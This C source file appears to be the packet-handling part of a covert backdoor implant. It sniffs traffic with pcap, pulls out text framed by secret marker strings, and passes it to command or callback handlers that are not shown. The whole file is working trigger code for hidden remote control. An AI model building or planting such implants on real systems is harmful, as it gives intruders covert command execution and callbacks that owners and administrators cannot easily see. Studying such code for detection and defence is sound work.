/*
 * packet.c
 * Packet-processing
 * By J. Stuart McMurray
 * Created 20190322
 * Last Modified 20190322
 */

#include <pcap.h>
#include <string.h>

#include "config.h"
#include "spawn.h"

#define BUFLEN 1024 /* Command buffer length */

size_t find_msg(const char *flag, size_t flen, char *buf, size_t blen,
        const unsigned char *pkt, size_t plen);

/* The lengths of both markers */
size_t cblen = strlen(CBFLAG);
size_t cmdlen = strlen(CMDFLAG);

/* handle_packet inspects the packet passed in by pcap_loop for a command and
 * handles it if found. */
void
handle_packet(u_char *u, const struct pcap_pkthdr *hdr, const u_char *pkt)
{
        char buf[BUFLEN+1];
        if (0 != find_msg(CBFLAG, cblen, buf, sizeof(buf), pkt, hdr->caplen))
                handle_cb(buf);
        else if (0 != find_msg(CMDFLAG, cmdlen, buf, sizeof(buf),
                                pkt, hdr->caplen))
                handle_cmd(buf);
}

/* find_msg searches the plen bytes starting at pkt for a sequence of bytes
 * surrounded by the flen bytes at flag.  If found, at most blen-1 bytes are
 * are put in buf, and buf is guaranteed to be NULL-terminated.  The number of
 * bytes found is returned.  If more than blen bytes are found, 0 is returned
 * and the contents of buf are undefined. */
size_t
find_msg(const char *flag, size_t flen, char *buf, size_t blen,
        const unsigned char *pkt, size_t plen)
{
        /* Start and end of found string */
        const unsigned char *start, *end;

        /* See if the marker's there */
        if (NULL == (start = memmem(pkt, plen, flag, flen)))
                return 0; /* Not there */
        start += flen; /* Start of the found string */

        /* See if we have an end marker */
        if (NULL == (end = memmem(start, plen-(start-pkt), flag, flen)))
                return 0; /* Not there */

        /* Save buffer */
        if (blen-1 < end-start)
                return 0;
        memset(buf, 0, blen);
        memcpy(buf, start, end-start);

        return end-start;
}
